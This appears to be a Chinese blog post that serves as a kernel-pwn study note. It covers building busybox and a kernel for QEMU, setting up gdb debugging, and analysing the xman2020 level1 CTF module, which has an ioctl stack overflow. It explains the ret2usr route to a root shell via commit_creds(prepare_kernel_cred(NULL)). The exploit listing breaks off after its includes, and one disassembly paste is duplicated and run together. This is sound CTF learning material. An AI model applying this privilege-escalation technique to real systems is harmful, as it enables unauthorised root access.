<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>尝试编译kernel和文件系统 | nyyyddddn</title>
  <meta name="author" content="nyyyddddn">
  
  <meta name="description" content="learn about kernel pwn
尝试编译kernel和文件系统，使用qemu启动step1:make filesystem (compile busybox)https://ctf-wiki.org/pwn/linux/kernel-mode/environment/qemu-emulate/#_3
下载busybox编译
wget https:&amp;#x2F;&amp;#x2F;busybox.net&amp;#x2F;downloads&amp;#x2F;busybox-1.32.1.tar.bz2
tar -jxf busybox-1.32.1.tar.bz2

make menuconfig &amp;#x2F;&amp;#x2F; 在Setting中把build static binay勾选 静态链接
make -j4
make install

在make install后可以看到busybox文件夹中多出来一个_install 文件夹， _install文件夹中有
lhj@lhj-virtual-machine:~&amp;#x2F;Desktop&amp;#x2F;nydn_kernel_learn&amp;#x2F;busybox-1.32.1&amp;#x2F;_install$ ls
bin  linuxrc  sbin  usr

创建必要的文件夹
lhj@lhj-virtual-machine:~&amp;#x2F;Desktop&amp;#x2F;nydn_kernel_learn&amp;#x2F;busybox-1.32.1&amp;#x2F;_install$ mkdir -p  proc sys dev etc&amp;#x2F;init.d
lhj@lhj-virtual-machine:~&amp;#x2F;Desktop&amp;#x2F;nydn_kernel_learn&amp;#x2F;busybox-1.32.1&amp;#x2F;_install$ ls
bin  dev  etc  linuxrc  proc  sbin  sys  usr"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="尝试编译kernel和文件系统"/>
  <meta property="og:site_name" content="nyyyddddn"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="nyyyddddn" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">nyyyddddn</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/catergories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> 尝试编译kernel和文件系统</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <p>learn about kernel pwn</p>
<h1 id="尝试编译kernel和文件系统，使用qemu启动"><a href="#尝试编译kernel和文件系统，使用qemu启动" class="headerlink" title="尝试编译kernel和文件系统，使用qemu启动"></a>尝试编译kernel和文件系统，使用qemu启动</h1><h2 id="step1-make-filesystem-compile-busybox"><a href="#step1-make-filesystem-compile-busybox" class="headerlink" title="step1:make filesystem (compile busybox)"></a>step1:make filesystem (compile busybox)</h2><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/environment/qemu-emulate/#_3">https://ctf-wiki.org/pwn/linux/kernel-mode/environment/qemu-emulate/#_3</a></p>
<p>下载busybox编译</p>
<pre class="line-numbers language-none"><code class="language-none">wget https:&#x2F;&#x2F;busybox.net&#x2F;downloads&#x2F;busybox-1.32.1.tar.bz2
tar -jxf busybox-1.32.1.tar.bz2

make menuconfig &#x2F;&#x2F; 在Setting中把build static binay勾选 静态链接
make -j4
make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在make install后可以看到busybox文件夹中多出来一个_install 文件夹， _install文件夹中有</p>
<pre class="line-numbers language-none"><code class="language-none">lhj@lhj-virtual-machine:~&#x2F;Desktop&#x2F;nydn_kernel_learn&#x2F;busybox-1.32.1&#x2F;_install$ ls
bin  linuxrc  sbin  usr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>创建必要的文件夹</p>
<pre class="line-numbers language-none"><code class="language-none">lhj@lhj-virtual-machine:~&#x2F;Desktop&#x2F;nydn_kernel_learn&#x2F;busybox-1.32.1&#x2F;_install$ mkdir -p  proc sys dev etc&#x2F;init.d
lhj@lhj-virtual-machine:~&#x2F;Desktop&#x2F;nydn_kernel_learn&#x2F;busybox-1.32.1&#x2F;_install$ ls
bin  dev  etc  linuxrc  proc  sbin  sys  usr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>在根目录下创建init文件，文件系统初始化的时候会调用这个文件</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;sh
echo &quot;INIT SCRIPT&quot;
mkdir &#x2F;tmp
mount -t proc none &#x2F;proc
mount -t sysfs none &#x2F;sys
mount -t devtmpfs none &#x2F;dev
mount -t debugfs none &#x2F;sys&#x2F;kernel&#x2F;debug
mount -t tmpfs none &#x2F;tmp
echo -e &quot;Boot took $(cut -d&#39; &#39; -f1 &#x2F;proc&#x2F;uptime) seconds&quot;
setsid &#x2F;bin&#x2F;cttyhack setuidgid 1000 &#x2F;bin&#x2F;sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>打包成cpio文件</p>
<pre class="line-numbers language-none"><code class="language-none">find . | cpio -o --format&#x3D;newc &gt; ..&#x2F;rootfs.cpio<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>cpio解压的命令</p>
<pre class="line-numbers language-none"><code class="language-none">cpio -idmv &lt; rootfs.img<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="step2-download-compile-kernel"><a href="#step2-download-compile-kernel" class="headerlink" title="step2:download &amp; compile kernel"></a>step2:download &amp; compile kernel</h2><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/environment/build-kernel/">https://ctf-wiki.org/pwn/linux/kernel-mode/environment/build-kernel/</a></p>
<p>缺少证书报错的解决方法 <a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_47696151/article/details/121574718">https://blog.csdn.net/m0_47696151/article/details/121574718</a> </p>
<p>在 <a target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/kernel/%E4%B8%AD%E4%B8%8B%E8%BD%BDkernel">https://mirrors.tuna.tsinghua.edu.cn/kernel/中下载kernel</a></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lhj@lhj-virtual-machine:~/Desktop/nydn_kernel_learn/level1$ <span class="token function">file</span> bzImage
bzImage: Linux kernel x86 boot executable bzImage, version <span class="token number">4.19</span>.0 <span class="token punctuation">(</span>bird@ubuntu18<span class="token punctuation">)</span> <span class="token comment">#1 SMP Thu Nov 1 16:50:59 CST 2018, RO-rootFS, swap_dev 0X8, Normal VGA</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>解压并编译内核，缺少证书的话上面有解决方法</p>
<pre class="line-numbers language-none"><code class="language-none">tar -xzvf linux-4.19.1.tar.gz
make menuconfig &#x2F;&#x2F; 直接save 生成.config配置文件
make -j4 bzImage<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>编译成功后的信息</p>
<pre class="line-numbers language-none"><code class="language-none">Setup is 17148 bytes (padded to 17408 bytes).
System is 8445 kB
CRC b1100637
Kernel: arch&#x2F;x86&#x2F;boot&#x2F;bzImage is ready  (#1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="step3-write-a-script-to-start-qemu"><a href="#step3-write-a-script-to-start-qemu" class="headerlink" title="step3: write a script to start qemu"></a>step3: write a script to start qemu</h2><p>这篇文章中有对一些常见的qemu参数的解释</p>
<p><a target="_blank" rel="noopener" href="https://lantern.cool/note-pwn-kernel-environment/">https://lantern.cool/note-pwn-kernel-environment/</a> </p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bash

qemu-system-x86_64 \
    -m 64M \
    -nographic \
    -kernel bzImage \
    -append &#39;console&#x3D;ttyS0 loglevel&#x3D;3 oops&#x3D;panic panic&#x3D;1 nokaslr&#39; \
    -monitor &#x2F;dev&#x2F;null \
    -initrd initramfs.cpio \
    -smp cores&#x3D;1,threads&#x3D;1 \
    -cpu qemu64 2&gt;&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="ctf-challenge"><a href="#ctf-challenge" class="headerlink" title="ctf challenge"></a>ctf challenge</h1><p>常用命令:</p>
<pre class="line-numbers language-none"><code class="language-none">lsmod 查看已经安装的驱动
insmod 安装驱动

cat &#x2F;proc&#x2F;modules 查看当前加载模块的地址 信息

grep prepare_kernel_cred  &#x2F;proc&#x2F;kallsyms 从内核符号表中查找符号
grep commit_creds &#x2F;proc&#x2F;kallsyms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="xman2020-level1"><a href="#xman2020-level1" class="headerlink" title="xman2020 level1"></a>xman2020 level1</h2><p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-276403.htm">https://bbs.kanxue.com/thread-276403.htm</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7625?time__1311=n4+xnD0G0=G=n4Gwx05+4oiitG8FerYi4D&alichlgref=https://xuanxuanblingbling.github.io/">https://xz.aliyun.com/t/7625?time__1311=n4%2BxnD0G0%3DG%3Dn4Gwx05%2B4oiitG8FerYi4D&amp;alichlgref=https%3A%2F%2Fxuanxuanblingbling.github.io%2F</a></p>
<p><a target="_blank" rel="noopener" href="https://blingblingxuanxuan.github.io/2022/12/25/22-12-15-ways-to-debug-linuxkernel/#%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95">https://blingblingxuanxuan.github.io/2022/12/25/22-12-15-ways-to-debug-linuxkernel/#%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95</a></p>
<p>gdb千万不要用pwndbg插件，要用gef去插件去调试，pwndbg调试会有各种奇奇怪怪的问题</p>
<p>本地调试的话，每次开启调试都要做一些设置比较繁琐，最好写几个批处理文件用于调试</p>
<p>pack.sh 用于编译exp，将exp打包进文件系统中</p>
<pre class="line-numbers language-none"><code class="language-none">musl-gcc -static -O2 exp.c -o exp
cp .&#x2F;exp .&#x2F;initramfs_content&#x2F;home&#x2F;pwn&#x2F;exp
cd .&#x2F;initramfs_content
find . | cpio -o --format&#x3D;newc &gt; ..&#x2F;initramfs.cpio
cd ..<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>startvm.sh 用于启动qemu，其中 -s参数的意思是</p>
<pre class="line-numbers language-none"><code class="language-none">-s              shorthand for -gdb tcp::1234<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bash

stty intr ^]
cd &#96;dirname $0&#96;
timeout --foreground 600 qemu-system-x86_64 \
    -m 64M \
    -nographic \
    -kernel bzImage \
    -append &#39;console&#x3D;ttyS0 loglevel&#x3D;3 oops&#x3D;panic panic&#x3D;1 nokaslr&#39; \
    -monitor &#x2F;dev&#x2F;null \
    -initrd initramfs.cpio \
    -smp cores&#x3D;1,threads&#x3D;1 \
    -cpu qemu64 2&gt;&#x2F;dev&#x2F;null \
    -s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>debug.sh 用于初始化gdb开启调试，其中baby.ko需要设置一下基地址，然后 b *(0xffffffffc0002000 + 0x24) 这个断点是题目逻辑中调用copy from user时候的地址</p>
<pre class="line-numbers language-none"><code class="language-none">gdb -q \
-ex &quot;file vmlinux&quot; \
-ex &quot;add-symbol-file baby.ko 0xffffffffc0002000&quot; \
-ex &quot;add-symbol-file exp&quot; \
-ex &quot;b *(0xffffffffc0002000 + 0x24)&quot; \
-ex &quot;target remote :1234&quot; \
-ex &quot;c&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>查看模块基地址的命令</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;home&#x2F;pwn # cat &#x2F;proc&#x2F;modules
baby 16384 0 - Live 0xffffffffc0002000 (POE)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>题目如果没有给 vmlinux 这个文件的话, 可以用extract-vmlinux.sh这个脚本从bzimage中提取vmlinux符号</p>
<p>使用方法，可以把这个脚本放在&#x2F;usr&#x2F;bin目录下</p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;extract-vmlinux .&#x2F;bzImage &gt; .&#x2F;vmlinux<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>extract-vmlinux.sh</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
<span class="token comment"># SPDX-License-Identifier: GPL-2.0-only</span>
<span class="token comment"># ----------------------------------------------------------------------</span>
<span class="token comment"># extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span>
<span class="token comment">#</span>
<span class="token comment"># Inspired from extract-ikconfig</span>
<span class="token comment"># (c) 2009,2010 Dick Streefland &lt;dick@streefland.net></span>
<span class="token comment">#</span>
<span class="token comment"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com></span>
<span class="token comment">#</span>
<span class="token comment"># ----------------------------------------------------------------------</span>

<span class="token function-name function">check_vmlinux</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token comment"># Use readelf to check if it's a valid ELF</span>
	<span class="token comment"># TODO: find a better to way to check that it's really vmlinux</span>
	<span class="token comment">#       and not just an elf</span>
	readelf <span class="token parameter variable">-h</span> <span class="token variable">$1</span> <span class="token operator">></span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">||</span> <span class="token builtin class-name">return</span> <span class="token number">1</span>

	<span class="token function">cat</span> <span class="token variable">$1</span>
	<span class="token builtin class-name">exit</span> <span class="token number">0</span>
<span class="token punctuation">&#125;</span>

<span class="token function-name function">try_decompress</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token comment"># The obscure use of the "tr" filter is to work around older versions of</span>
	<span class="token comment"># "grep" that report the byte offset of the line instead of the pattern.</span>

	<span class="token comment"># Try to find the header ($1) and decompress from here</span>
	<span class="token keyword">for</span>	<span class="token for-or-select variable">pos</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">`</span><span class="token function">tr</span> <span class="token string">"<span class="token variable">$1</span><span class="token entity" title="\n">\n</span><span class="token variable">$2</span>"</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token variable">$2</span>="</span> <span class="token operator">&lt;</span> <span class="token string">"<span class="token variable">$img</span>"</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-abo</span> <span class="token string">"^<span class="token variable">$2</span>"</span><span class="token variable">`</span></span>
	<span class="token keyword">do</span>
		<span class="token assign-left variable">pos</span><span class="token operator">=</span><span class="token variable">$&#123;pos<span class="token operator">%%</span><span class="token operator">:</span>*&#125;</span>
		<span class="token function">tail</span> -c+<span class="token variable">$pos</span> <span class="token string">"<span class="token variable">$img</span>"</span> <span class="token operator">|</span> <span class="token variable">$3</span> <span class="token operator">></span> <span class="token variable">$tmp</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span> /dev/null
		check_vmlinux <span class="token variable">$tmp</span>
	<span class="token keyword">done</span>
<span class="token punctuation">&#125;</span>

<span class="token comment"># Check invocation:</span>
<span class="token assign-left variable">me</span><span class="token operator">=</span><span class="token variable">$&#123;0<span class="token operator">##</span>*<span class="token operator">/</span>&#125;</span>
<span class="token assign-left variable">img</span><span class="token operator">=</span><span class="token variable">$1</span>
<span class="token keyword">if</span>	<span class="token punctuation">[</span> <span class="token variable">$#</span> <span class="token parameter variable">-ne</span> <span class="token number">1</span> <span class="token parameter variable">-o</span> <span class="token operator">!</span> <span class="token parameter variable">-s</span> <span class="token string">"<span class="token variable">$img</span>"</span> <span class="token punctuation">]</span>
<span class="token keyword">then</span>
	<span class="token builtin class-name">echo</span> <span class="token string">"Usage: <span class="token variable">$me</span> &lt;kernel-image>"</span> <span class="token operator">></span><span class="token file-descriptor important">&amp;2</span>
	<span class="token builtin class-name">exit</span> <span class="token number">2</span>
<span class="token keyword">fi</span>

<span class="token comment"># Prepare temp files:</span>
<span class="token assign-left variable">tmp</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>mktemp /tmp/vmlinux-XXX<span class="token variable">)</span></span>
<span class="token builtin class-name">trap</span> <span class="token string">"rm -f <span class="token variable">$tmp</span>"</span> <span class="token number">0</span>

<span class="token comment"># That didn't work, so retry after decompression.</span>
try_decompress <span class="token string">'\037\213\010'</span> xy    gunzip
try_decompress <span class="token string">'\3757zXZ\000'</span> abcde unxz
try_decompress <span class="token string">'BZh'</span>          xy    bunzip2
try_decompress <span class="token string">'\135\0\0\0'</span>   xxx   unlzma
try_decompress <span class="token string">'\211\114\132'</span> xy    <span class="token string">'lzop -d'</span>
try_decompress <span class="token string">'\002!L\030'</span>   xxx   <span class="token string">'lz4 -d'</span>
try_decompress <span class="token string">'(\265/\375'</span>   xxx   unzstd

<span class="token comment"># Finally check for uncompressed images or objects:</span>
check_vmlinux <span class="token variable">$img</span>

<span class="token comment"># Bail out:</span>
<span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$me</span>: Cannot find vmlinux."</span> <span class="token operator">></span><span class="token file-descriptor important">&amp;2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面的脚本使用方法是，写好exp.c后运行pack把exp编译好打包进文件系统里，然后startvm启动qemu，debug.sh去连接qemu并且在 题目定义的驱动中下一个断点，然后再qemu中运行exp这个二进制文件，这时候gdb就会在题目的逻辑那断下来，就可以开始在gdb上调试了</p>
<p>题目的逻辑是这样的</p>
<p>init_module是一个特殊的函数名，使用insmod去把这个程序加载到内核中的时候，这个函数会被调用，作用和main函数差不多的，misc_register是注册一个字符设备，字符设备以字符为单位进行读写的操作</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">init_module</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">_fentry__</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">misc_register</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>off_120<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后 这个是这个字符设备名称叫baby</p>
<pre class="line-numbers language-none"><code class="language-none">data:0000000000000120
.data:0000000000000120                               ; Segment type: Pure data
.data:0000000000000120                               ; Segment permissions: Read&#x2F;Write
.data:0000000000000120                               _data segment align_32 public &#39;DATA&#39; use64
.data:0000000000000120                               assume cs:_data
.data:0000000000000120                               ;org 120h
.data:0000000000000120 FF 00 00 00 00 00 00 00       off_120 dq offset unk_FF                ; DATA XREF: init_module+6↑o
.data:0000000000000120                                                                       ; cleanup_module+6↑o
.data:0000000000000128 7F 00 00 00 00 00 00 00       dq offset aBaby                         ; &quot;baby&quot;
.data:0000000000000130 80 01 00 00 00 00 00 00       dq offset off_180
.data:0000000000000138 00 00 00 00 00 00 00 00 00 00+align 80h
.data:0000000000000180 80 02 00 00 00 00 00 00       off_180 dq offset __this_module         ; DATA XREF: .data:0000000000000130↑oxxxxxxxxxx data:0000000000000120.data:0000000000000120                               ; Segment type: Pure data.data:0000000000000120                               ; Segment permissions: Read&#x2F;Write.data:0000000000000120                               _data segment align_32 public &#39;DATA&#39; use64.data:0000000000000120                               assume cs:_data.data:0000000000000120                               ;org 120h.data:0000000000000120 FF 00 00 00 00 00 00 00       off_120 dq offset unk_FF                ; DATA XREF: init_module+6↑o.data:0000000000000120                                                                       ; cleanup_module+6↑o.data:0000000000000128 7F 00 00 00 00 00 00 00       dq offset aBaby                         ; &quot;baby&quot;.data:0000000000000130 80 01 00 00 00 00 00 00       dq offset off_180.data:0000000000000138 00 00 00 00 00 00 00 00 00 00+align 80h.data:0000000000000180 80 02 00 00 00 00 00 00       off_180 dq offset __this_module         ; DATA XREF: .data:0000000000000130↑o__int64 __fastcall sub_0(__int64 a1, int a2)&#123;  __int64 v2; &#x2F;&#x2F; rbp  __int64 v3; &#x2F;&#x2F; rdx  _QWORD v5[17]; &#x2F;&#x2F; [rsp-88h] [rbp-88h] BYREF  _fentry__();  if ( a2 !&#x3D; 24577 )    return 0LL;  v5[16] &#x3D; v2;  return (int)copy_from_user(v5, v3, 256LL);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>往下看可以发现这个字符设备的处理函数在这里</p>
<pre class="line-numbers language-none"><code class="language-none">__int64 __fastcall sub_0(__int64 a1, int a2)
&#123;
  __int64 v2; &#x2F;&#x2F; rbp
  __int64 v3; &#x2F;&#x2F; rdx
  _QWORD v5[17]; &#x2F;&#x2F; [rsp-88h] [rbp-88h] BYREF

  _fentry__();
  if ( a2 !&#x3D; 24577 )
    return 0LL;
  v5[16] &#x3D; v2;
  return (int)copy_from_user(v5, v3, 256LL);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>和字符设备交互，使用 &lt;sys&#x2F;ioctl.h&gt; 中的 ioctl() 函数，查看ioctl函数的定义并且结合题目中字符设备处理函数可以发现 a1 a2 a3 正好是对应ioctl的三个参数，a2要 &#x3D;&#x3D; 24577才能往下走，然后copy_from_user的第二个参数是一个用户态的指针，所以使用ioctl的时候 第二个参数的值要 &#x3D;&#x3D; 24577 第三个参数的值是一个指针</p>
<pre class="line-numbers language-none"><code class="language-none">extern int __ioctl_time64 (int __fd, unsigned long int __request, ...) __THROW;
#  define ioctl __ioctl_time64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>然后copy from user这里存在一个内核栈溢出，题目没有开启smep smap 以及kaslr的保护，可以使用ret2usr</p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/ret2usr/#:~:text=%E9%80%9A%E5%B8%B8%20CTF%20%E4%B8%AD%E7%9A%84%20ret2usr%20%E8%BF%98%E6%98%AF%E4%BB%A5%E6%89%A7%E8%A1%8C%20commit_creds%20%28prepare_kernel_cred,%28NULL%29%29%20%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83%E4%B8%BA%E4%B8%BB%E8%A6%81%E7%9A%84%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95%EF%BC%8C%E4%B8%8D%E8%BF%87%E7%9B%B8%E6%AF%94%E8%B5%B7%E6%9E%84%E9%80%A0%E5%86%97%E9%95%BF%E7%9A%84%20ROP%20chain%EF%BC%8Cret2usr%20%E5%8F%AA%E9%9C%80%E6%88%91%E4%BB%AC%E8%A6%81%E6%8F%90%E5%89%8D%E5%9C%A8%E7%94%A8%E6%88%B7%E6%80%81%E7%A8%8B%E5%BA%8F%E6%9E%84%E9%80%A0%E5%A5%BD%E5%AF%B9%E5%BA%94%E7%9A%84%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88%E3%80%81%E8%8E%B7%E5%8F%96%E7%9B%B8%E5%BA%94%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80%E5%90%8E%E7%9B%B4%E6%8E%A5%20ret%20%E5%9B%9E%E5%88%B0%E7%94%A8%E6%88%B7%E7%A9%BA%E9%97%B4%E6%89%A7%E8%A1%8C%E5%8D%B3%E5%8F%AF%E3%80%82">https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/ret2usr/#:~:text=%E9%80%9A%E5%B8%B8%20CTF%20%E4%B8%AD%E7%9A%84%20ret2usr%20%E8%BF%98%E6%98%AF%E4%BB%A5%E6%89%A7%E8%A1%8C%20commit_creds%20%28prepare_kernel_cred,%28NULL%29%29%20%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83%E4%B8%BA%E4%B8%BB%E8%A6%81%E7%9A%84%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95%EF%BC%8C%E4%B8%8D%E8%BF%87%E7%9B%B8%E6%AF%94%E8%B5%B7%E6%9E%84%E9%80%A0%E5%86%97%E9%95%BF%E7%9A%84%20ROP%20chain%EF%BC%8Cret2usr%20%E5%8F%AA%E9%9C%80%E6%88%91%E4%BB%AC%E8%A6%81%E6%8F%90%E5%89%8D%E5%9C%A8%E7%94%A8%E6%88%B7%E6%80%81%E7%A8%8B%E5%BA%8F%E6%9E%84%E9%80%A0%E5%A5%BD%E5%AF%B9%E5%BA%94%E7%9A%84%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88%E3%80%81%E8%8E%B7%E5%8F%96%E7%9B%B8%E5%BA%94%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80%E5%90%8E%E7%9B%B4%E6%8E%A5%20ret%20%E5%9B%9E%E5%88%B0%E7%94%A8%E6%88%B7%E7%A9%BA%E9%97%B4%E6%89%A7%E8%A1%8C%E5%8D%B3%E5%8F%AF%E3%80%82</a></p>
<p>ret2usr的攻击方式是，在内核中执行 commit_creds(prepare_kernel_cred(NULL)) 这个函数调用，把当前进程的cred结构体替换成root权限的cred结构体提权，然后使用swapgs 和 iret去切换到用户态，执行用户态中text段的system(&#x2F;bin&#x2F;sh)，这样就有root权限的shell了</p>
<p>iret这个指令需要保证栈布局为，所以，在和字符设备交互前，需要把用户态下的段寄存器 flag寄存器保存一下</p>
<pre class="line-numbers language-none"><code class="language-none">rsp --&gt; user_rip
--&gt; user_cs_register
--&gt; user_flag_register
--&gt; user_sp_register
--&gt; user_ss_register<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>其中user_rip这个位置可以写执行system binsh函数调用的地址</p>
<p>prepare_kernel_cred commit_creds这两个是内核中的函数，可以通过这两条命令去找他的地址，需要在root权限下才能找到，kallsyms这个文件存放着内核相关的符号，因为题目没有开启kaslr，所以prepare_kernel_cred 和 commit_creds 的地址的固定的，然后关于cred结构体上面的连接有介绍</p>
<pre class="line-numbers language-none"><code class="language-none">grep prepare_kernel_cred  &#x2F;proc&#x2F;kallsyms 从内核符号表中查找符号
grep commit_creds &#x2F;proc&#x2F;kallsyms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>然后关于at&amp;t的汇编 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/wingsummer/p/16305622.html">https://www.cnblogs.com/wingsummer/p/16305622.html</a> 这里有一篇文章</p>
<p>exp:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
